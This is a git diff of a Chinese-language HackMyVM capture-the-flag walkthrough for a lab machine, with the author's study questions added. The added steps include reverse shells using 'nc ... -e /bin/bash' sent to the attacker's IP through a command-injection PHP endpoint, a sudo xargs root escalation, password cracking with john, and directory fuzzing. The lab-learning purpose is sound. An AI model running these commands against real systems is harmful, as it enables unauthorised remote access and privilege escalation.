@@ -80,6 +80,10 @@ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirb/big.txt -u 'http://192.168
 wget http://192.168.6.166/scout/j2/docs/shellfile.ods
 libreoffice2john shellfile.odf > key_hash
 john -w=/usr/share/wordlists/rockyou.txt key_hash
+
+###
+#疑问：我并没有查到相关官方文档说.ods中默认采用PBKDF2进行密钥派生得到密钥并利用AES对称加密，然后用SHA-1散列派生的密钥，是因为我没有查到相关文档吗？如果.ods采用未知的加密模式怎么办？还是说libreoffice2john工具能自动识别.ods文件的加密模式？
+###
 ```
 
 <img src="hmv.arroutada.assets/image-20240620142240114.png" alt="image-20240620142240114" style="zoom: 50%;" />
@@ -129,7 +133,7 @@ ffuf -w /usr/share/wordlists/rockyou.txt -u 'http://192.168.6.166/thejabasshell.
 
 ![image-20240620155734544](hmv.arroutada.assets/image-20240620155734544.png)
 
-## 4、获取shell
+## 5、获取shell
 
 ```bash
 #现有条件为命令可执行，且靶机仅开放了80端口，没有开放ssh的22端口，因此无法正向shell，只能反弹shell。先kali使用nc监听5555端口，然后给a的值设置为nc 192.168.6.149 5555 -e /bin/bash然后访问,拿到shell。
@@ -180,17 +184,53 @@ cat index.html
 ![image-20240620170626021](hmv.arroutada.assets/image-20240620170626021.png)
 
 ```bash
-#得到一个Brainfuck编码，解码结果为all HackMyVM hackers!!且提示了一个文件priv.php，这个文件应该就是接下来的突破点。
+#得到一个Brainfuck编码，解码结果为all HackMyVM hackers!!且提示了一个文件priv.php，这个文件应该就是接下来的突破点。继续把他wget down下来查看内容
+wget http://127.0.0.1:8000/priv.php
+cat priv.php
 ```
 
 ![image-20240620170824511](hmv.arroutada.assets/image-20240620170824511.png)
 
+<img src="hmv.arroutada.assets/image-20240620171628302.png" alt="image-20240620171628302" style="zoom:50%;" />
+
+```bash
+#$json接收传入的原始post数据，然后解析json给$data，json会将command参数的值传递给system()函数，system()函数执行这个值（命令），因此得到可以任意命令执行的利用链。
+#在kali上监听6666端口，用wget以post形式提交表单
+wget --post-data='{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php
+
+#获取到drito用户的权限
+```
+
+![image-20240620172602324](hmv.arroutada.assets/image-20240620172602324.png)
+
+<img src="hmv.arroutada.assets/image-20240620172648234.png" alt="image-20240620172648234" style="zoom:50%;" />
+
+<img src="hmv.arroutada.assets/image-20240620172753030.png" alt="image-20240620172753030" style="zoom:50%;" />
+
+## 6、获取root权限
+
+```bash
+#sudo -l发现xargs有root权限。
+#https://gtfobins.github.io/gtfobins/xargs/#sudo中为利用xargs提权的方法（break out from restricted environments）
+#仔细学习研究为什么能提权。
+
+sudo xargs -a /dev/null sh
+#获取root权限
+```
+
+<img src="hmv.arroutada.assets/image-20240620173031777.png" alt="image-20240620173031777" style="zoom:50%;" />
+
+<img src="hmv.arroutada.assets/image-20240620173714828.png" alt="image-20240620173714828" style="zoom:50%;" />
+
 ```bash
 ###
-#疑问：我并没有查到相关官方文档说.ods中默认采用PBKDF2进行密钥派生得到密钥并利用AES对称加密，然后用SHA-1散列派生的密钥，是因为我没有查到相关文档吗？如果.ods采用未知的加密模式怎么办？还是说libreoffice2john工具能自动识别.ods文件的加密模式？
+#请教：请问有没有一些常用的好用的字典？或者推荐某个网站上有？或者推荐某个git上有？
+#终极疑问：/scout/j2/docs下的pass.txt文件中的内容user:password有什么用？全文没有发现它被使用到。
 ###
+```
 
-有没有一些常用的好用的字典？
+```bash
+#PS：
 #爆破文件目录和文件名
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /usr/share/wordlists/dirb/big.txt
